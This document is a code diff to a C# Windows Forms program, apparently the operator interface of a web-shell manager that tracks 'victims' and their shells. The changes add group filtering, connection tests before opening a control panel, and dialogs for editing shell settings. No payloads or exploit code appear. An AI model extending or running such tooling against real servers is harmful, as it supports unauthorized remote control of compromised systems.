@@ -5,6 +5,11 @@ namespace Alien
     public partial class frmMain : Form
     {
         public clsSqlite m_sqlConn;
+        private string[] m_generalGroup = 
+        {
+            "_All",
+            "_Orphan",
+        };
 
         public frmMain()
         {
@@ -75,7 +80,8 @@ namespace Alien
             m_sqlConn = sqlConn;
 
             TreeNode node = new TreeNode("Group");
-            node.Nodes.Add(new TreeNode("All"));
+            node.Nodes.Add(new TreeNode("_All"));
+            node.Nodes.Add(new TreeNode("_Orphan"));
 
             treeView1.Nodes.Add(node);
             treeView1.ExpandAll();
@@ -84,7 +90,7 @@ namespace Alien
 
             foreach (string szGroupName in m_sqlConn.m_lsGroupName)
             {
-                if (szGroupName == "All" || string.IsNullOrEmpty(szGroupName))
+                if (szGroupName.StartsWith("_") || string.IsNullOrEmpty(szGroupName))
                     continue;
 
                 treeView1.Nodes[0].Nodes.Add(szGroupName);
@@ -97,12 +103,16 @@ namespace Alien
         }
 
         //Control Panel
-        private void toolStripMenuItem1_Click(object sender, EventArgs e)
+        private async void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmControlPanel f = new frmControlPanel(fnGetVictimTag(item));
-                f.Show();
+                clsWeb web = fnGetVictimTag(item);
+                if (await web.fnbTestWebConnection() && await web.fnbTestShellConnection())
+                {
+                    frmControlPanel f = new frmControlPanel(web);
+                    f.Show();
+                }
             }
         }
 
@@ -137,6 +147,23 @@ namespace Alien
             if (e.KeyCode == Keys.F5)
             {
                 fnLoadShell();
+            }
+            else if (e.KeyCode == Keys.Enter)
+            {
+                List<clsWeb> lc = fnGetVictimList(listView1);
+                if (lc.Count == 0)
+                    return;
+                else if (lc.Count > 1)
+                    MessageBox.Show("Multiple shells selected, the first shell will be automatically chosen.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+                clsWeb web = lc[0];
+                frmEditShell f = new frmEditShell(m_sqlConn, web.m_victim.m_ShellConfig, false);
+                f.StartPosition = FormStartPosition.CenterScreen;
+                f.Text = "Edit Shell";
+
+                f.m_sqlConn = m_sqlConn;
+
+                f.ShowDialog();
             }
         }
 
@@ -196,12 +223,35 @@ namespace Alien
 
         private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
         {
+            TreeNode node = treeView1.SelectedNode;
+            if (node.Parent == null || string.Equals(node.Text, "All"))
+                return;
 
+            var ls = m_sqlConn.fnGetShellWithGroupName(node.Text);
+            fnLoadShell(ls);
         }
 
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
-            
+
+        }
+
+        private void listView1_DoubleClick(object sender, EventArgs e)
+        {
+            List<clsWeb> lc = fnGetVictimList(listView1);
+            if (lc.Count == 0)
+                return;
+            else if (lc.Count > 1)
+                MessageBox.Show("Multiple shells selected, the first shell will be automatically chosen.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+            clsWeb web = lc[0];
+            frmEditShell f = new frmEditShell(m_sqlConn, web.m_victim.m_ShellConfig, false);
+            f.StartPosition = FormStartPosition.CenterScreen;
+            f.Text = "Edit Shell";
+
+            f.m_sqlConn = m_sqlConn;
+
+            f.ShowDialog();
         }
     }
 }
